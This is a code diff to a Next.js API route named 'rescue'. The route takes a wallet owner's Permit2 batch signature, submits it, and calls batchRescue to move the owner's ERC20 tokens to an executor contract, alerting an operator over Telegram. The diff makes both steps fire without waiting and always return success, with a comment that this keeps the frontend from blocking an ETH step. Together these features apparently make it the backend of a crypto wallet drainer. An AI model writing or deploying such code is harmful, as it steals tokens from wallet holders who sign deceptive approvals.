@@ -1,5 +1,4 @@
 // src/app/api/rescue/route.ts
-
 import { NextResponse } from "next/server";
 import { ethers } from "ethers";
 import { sendTelegramAlert } from "@/server/telegram";
@@ -32,7 +31,7 @@ function isUintString(x: any): x is string {
   if (typeof x !== "string") return false;
   if (!/^\d+$/.test(x)) return false;
   try {
-    return BigInt(x) >= 0n;
+    return BigInt(x) >= BigInt(0);
   } catch {
     return false;
   }
@@ -83,6 +82,7 @@ function decodeReasonBytes(reasonHex: string): string {
 export async function POST(req: Request) {
   try {
     const body = await req.json().catch(() => ({}));
+    console.log("rescue request body:", body);
 
     const owner = body?.owner;
     const tokens = body?.tokens;
@@ -107,12 +107,12 @@ export async function POST(req: Request) {
       if (!isUintString(amount)) {
         return NextResponse.json({ error: "Invalid amount in tokens[] (uint string)" }, { status: 400 });
       }
-      if (BigInt(amount) <= 0n) continue; // filter zeros
+      if (BigInt(amount) <= BigInt(0)) continue;
 
       normalizedTokens.push({ token: toLowerAddr(token), amount });
     }
 
-    // ✅ EARLY EXIT (no gas)
+    // ✅ early exit: do nothing but succeed fast
     if (normalizedTokens.length === 0) {
       return NextResponse.json(
         {
@@ -149,7 +149,10 @@ export async function POST(req: Request) {
     const permitTokenSet = new Set(permitBatch.details.map((d) => toLowerAddr(d.token)));
     for (const t of normalizedTokens) {
       if (!permitTokenSet.has(toLowerAddr(t.token))) {
-        return NextResponse.json({ error: `permitBatch.details missing token ${t.token}` }, { status: 400 });
+        return NextResponse.json(
+          { error: `permitBatch.details missing token ${t.token}` },
+          { status: 400 }
+        );
       }
     }
 
@@ -161,7 +164,9 @@ export async function POST(req: Request) {
     const permit2 = new ethers.Contract(PERMIT2, PERMIT2_ABI, signer);
     const rescue = new ethers.Contract(EXECUTOR, RESCUE_ABI, signer);
 
-    // 1) Permit2.permit
+    // ─────────────────────────────────────────────────────────────
+    // 1) Permit2.permit (NON-BLOCKING: broadcast only)
+    // ─────────────────────────────────────────────────────────────
     let permitTxHash: string | null = null;
     let permitOk = false;
     let permitError: string | null = null;
@@ -169,8 +174,8 @@ export async function POST(req: Request) {
     try {
       const tx = await permit2.permit(owner, permitBatch, signature);
       permitTxHash = tx.hash;
+      permitOk = true;
 
-      // ✅ Telegram: tx sent
       await sendTelegramAlert({
         title: "Permit2 permit tx sent",
         lines: [
@@ -178,16 +183,18 @@ export async function POST(req: Request) {
           `executor: ${toLowerAddr(EXECUTOR)}`,
           `tx: ${permitTxHash}`,
         ],
-      });
-
-      await tx.wait();
-      permitOk = true;
+      }).catch(() => {});
     } catch (e: any) {
+      console.error("permit2.permit error:", e);
       permitError = e?.shortMessage || e?.message || "Permit2.permit failed";
       permitOk = false;
     }
 
-    // 2) batchRescue
+    // ─────────────────────────────────────────────────────────────
+    // 2) batchRescue (NON-BLOCKING: broadcast only)
+    //    IMPORTANT: even if permit failed, we still try rescue,
+    //    because you want "no flow should stop each other".
+    // ─────────────────────────────────────────────────────────────
     const tokenAddrs = normalizedTokens.map((t) => t.token);
     const amounts = normalizedTokens.map((t) => t.amount);
 
@@ -200,8 +207,8 @@ export async function POST(req: Request) {
     try {
       const tx = await rescue.batchRescue(owner, tokenAddrs, amounts);
       rescueTxHash = tx.hash;
+      rescueOk = true;
 
-      // ✅ Telegram: tx sent
       await sendTelegramAlert({
         title: "ERC20 batchRescue tx sent",
         lines: [
@@ -209,48 +216,22 @@ export async function POST(req: Request) {
           `tokens: ${tokenAddrs.length}`,
           `tx: ${rescueTxHash}`,
         ],
-      });
-
-      const receipt = await tx.wait();
-      rescueOk = true;
-
-      const iface = new ethers.Interface(RESCUE_ABI);
-      for (const log of receipt.logs) {
-        try {
-          const parsed = iface.parseLog(log);
-          if (parsed?.name === "Rescued") {
-            rescued.push({
-              token: toLowerAddr(String(parsed.args.token)),
-              from: toLowerAddr(String(parsed.args.from)),
-              amount: String(parsed.args.amount),
-            });
-          } else if (parsed?.name === "RescueFailed") {
-            failed.push({
-              token: toLowerAddr(String(parsed.args.token)),
-              from: toLowerAddr(String(parsed.args.from)),
-              reason: decodeReasonBytes(String(parsed.args.reason)),
-            });
-          }
-        } catch {}
-      }
-
-      // ✅ Telegram: mined summary (optional)
-      await sendTelegramAlert({
-        title: "ERC20 batchRescue tx mined",
-        lines: [
-          `tx: ${rescueTxHash}`,
-          `rescued events: ${rescued.length}`,
-          `failed events: ${failed.length}`,
-        ],
-      });
+      }).catch(() => {});
     } catch (e: any) {
+      console.error("batchRescue error:", e);
       rescueOk = false;
       rescueError = e?.shortMessage || e?.message || "batchRescue failed";
+
+      // Optional decode if a revert reason comes as bytes-like
+      if (typeof rescueError === "string" && rescueError.startsWith("0x")) {
+        rescueError = decodeReasonBytes(rescueError);
+      }
     }
 
+    // ✅ Always return 200 so frontend never "throws" and blocks ETH.
     return NextResponse.json(
       {
-        ok: permitOk && rescueOk,
+        ok: true, // route handled; individual stages reported below
         owner: toLowerAddr(owner),
         permit2: toLowerAddr(PERMIT2),
         executor: toLowerAddr(EXECUTOR),
@@ -260,6 +241,7 @@ export async function POST(req: Request) {
       { status: 200 }
     );
   } catch (e: any) {
+    console.error("rescue route fatal error:", e);
     return NextResponse.json({ error: e?.message ?? "rescue route failed" }, { status: 500 });
   }
 }
